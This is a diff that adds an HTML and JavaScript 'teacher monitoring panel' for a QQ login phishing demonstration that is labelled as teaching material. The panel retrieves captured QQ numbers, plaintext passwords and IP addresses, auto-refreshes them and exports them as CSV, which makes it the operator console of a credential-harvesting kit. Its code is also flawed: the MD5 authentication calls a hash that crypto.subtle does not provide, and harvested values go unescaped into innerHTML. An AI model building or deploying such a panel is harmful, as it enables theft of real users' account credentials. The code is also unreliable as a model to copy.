@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>教师监控面板 - QQ登录演示</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-chalkboard-teacher"></i> 教师监控面板 - QQ登录钓鱼演示</h1>
+            <p>实时监控所有学生的登录尝试 - 仅用于教学目的</p>
+        </div>
+        
+        <div class="auth-container" id="authContainer">
+            <h2><i class="fas fa-lock"></i> 教师认证</h2>
+            <div class="input-group">
+                <label for="teacherPassword">密码</label>
+                <input type="password" id="teacherPassword" placeholder="请输入教师密码">
+            </div>
+            <button id="authButton" class="login-btn">登录</button>
+        </div>
+        
+        <div id="teacherPanel" style="display: none;">
+            <div class="stats-container">
+                <div class="stat-card">
+                    <h3>总登录尝试</h3>
+                    <p id="totalAttempts">0</p>
+                </div>
+                <div class="stat-card">
+                    <h3>最近活动</h3>
+                    <p id="lastActivity">--:--:--</p>
+                </div>
+                <div class="stat-card">
+                    <h3>数据状态</h3>
+                    <p id="dataStatus">活跃</p>
+                </div>
+            </div>
+            
+            <div class="controls">
+                <button id="clearData" class="control-btn danger">
+                    <i class="fas fa-trash"></i> 清除所有数据
+                </button>
+                <button id="exportData" class="control-btn success">
+                    <i class="fas fa-download"></i> 导出数据
+                </button>
+                <button id="refreshData" class="control-btn primary">
+                    <i class="fas fa-sync"></i> 刷新数据
+                </button>
+            </div>
+            
+            <div class="data-container">
+                <h2><i class="fas fa-database"></i> 登录数据记录</h2>
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>时间</th>
+                                <th>QQ号码</th>
+                                <th>密码</th>
+                                <th>IP地址</th>
+                            </tr>
+                        </thead>
+                        <tbody id="dataBody">
+                            <tr>
+                                <td colspan="4" class="no-data">暂无数据</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="demo-info">
+                <h3><i class="fas fa-info-circle"></i> 教学指南</h3>
+                <p>1. 让学生访问此演示页面并输入模拟账号密码</p>
+                <p>2. 所有登录尝试将显示在此监控面板</p>
+                <p>3. 使用此演示讲解钓鱼攻击的危害和防范措施</p>
+                <p>4. 演示结束后请清除数据保护隐私</p>
+                
+                <div class="share-link">
+                    <h4><i class="fas fa-share-alt"></i> 学生访问链接</h4>
+                    <input type="text" id="studentLink" readonly>
+                    <button onclick="copyStudentLink()"><i class="fas fa-copy"></i> 复制</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 网络安全教学演示 | 仅用于教育目的 | 请勿用于非法用途</p>
+        </div>
+    </div>
+
+    <script src="/script.js"></script>
+    <script>
+        // 显示学生访问链接
+        document.getElementById('studentLink').value = window.location.origin;
+        
+        // 复制链接函数
+        function copyStudentLink() {
+            const copyText = document.getElementById("studentLink");
+            copyText.select();
+            document.execCommand("copy");
+            alert("已复制链接: " + copyText.value);
+        }
+        
+        let authToken = null;
+        let loginData = [];
+        
+        // 教师认证
+        document.getElementById('authButton').addEventListener('click', async () => {
+            const password = document.getElementById('teacherPassword').value;
+            
+            if (!password) {
+                alert('请输入密码');
+                return;
+            }
+            
+            // 生成认证令牌（MD5哈希）
+            authToken = await generateAuthToken(password);
+            
+            // 尝试获取数据验证密码
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'get_data',
+                        auth: authToken
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // 显示教师面板
+                    document.getElementById('authContainer').style.display = 'none';
+                    document.getElementById('teacherPanel').style.display = 'block';
+                    
+                    // 加载数据
+                    loginData = result.data || [];
+                    displayData();
+                    updateStats();
+                    
+                    // 开始定期刷新
+                    startAutoRefresh();
+                } else {
+                    alert('密码错误');
+                }
+            } catch (error) {
+                console.error('认证错误:', error);
+                alert('认证失败，请重试');
+            }
+        });
+        
+        // 生成认证令牌
+        async function generateAuthToken(password) {
+            // 使用简单的MD5哈希作为认证令牌
+            const encoder = new TextEncoder();
+            const data = encoder.encode(password);
+            const hashBuffer = await crypto.subtle.digest('MD5', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+        
+        // 显示数据
+        function displayData() {
+            const dataBody = document.getElementById('dataBody');
+            
+            if (loginData.length === 0) {
+                dataBody.innerHTML = '<tr><td colspan="4" class="no-data">暂无登录数据</td></tr>';
+                return;
+            }
+            
+            // 显示最新数据在前
+            const reversedData = [...loginData].reverse();
+            
+            dataBody.innerHTML = reversedData.map(item => `
+                <tr>
+                    <td>${item.time}</td>
+                    <td>${item.username}</td>
+                    <td>${item.password}</td>
+                    <td>${item.ip || '未知'}</td>
+                </tr>
+            `).join('');
+        }
+        
+        // 更新统计数据
+        function updateStats() {
+            document.getElementById('totalAttempts').textContent = loginData.length;
+            
+            if (loginData.length > 0) {
+                const lastAttempt = loginData[loginData.length - 1];
+                document.getElementById('lastActivity').textContent = lastAttempt.time;
+            }
+        }
+        
+        // 刷新数据
+        async function refreshData() {
+            if (!authToken) return;
+            
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'get_data',
+                        auth: authToken
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    loginData = result.data || [];
+                    displayData();
+                    updateStats();
+                }
+            } catch (error) {
+                console.error('刷新数据错误:', error);
+            }
+        }
+        
+        // 开始自动刷新
+        function startAutoRefresh() {
+            // 每10秒刷新一次数据
+            setInterval(refreshData, 10000);
+        }
+        
+        // 刷新数据按钮
+        document.getElementById('refreshData').addEventListener('click', refreshData);
+        
+        // 清除数据按钮
+        document.getElementById('clearData').addEventListener('click', async () => {
+            if (!authToken) return;
+            
+            if (confirm('确定要清除所有数据吗？此操作不可撤销。')) {
+                try {
+                    const response = await fetch('/api/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'clear_data',
+                            auth: authToken
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        loginData = [];
+                        displayData();
+                        updateStats();
+                        alert('数据已清除');
+                    } else {
+                        alert('清除数据失败');
+                    }
+                } catch (error) {
+                    console.error('清除数据错误:', error);
+                    alert('清除数据失败');
+                }
+            }
+        });
+        
+        // 导出数据按钮
+        document.getElementById('exportData').addEventListener('click', () => {
+            if (loginData.length === 0) {
+                alert('没有数据可导出');
+                return;
+            }
+            
+            const csvContent = "data:text/csv;charset=utf-8,"
+                + "时间,QQ号码,密码,IP地址\n"
+                + loginData.map(e => `"${e.time}","${e.username}","${e.password}","${e.ip}"`).join("\n");
+            
+            const encodedUri = encodeURI(csvContent);
+            const link = document.createElement("a");
+            link.setAttribute("href", encodedUri);
+            link.setAttribute("download", "qq_login_data.csv");
+            document.body.appendChild(link);
+            
+            link.click();
+            document.body.removeChild(link);
+        });
+    </script>
+</body>
+</html>
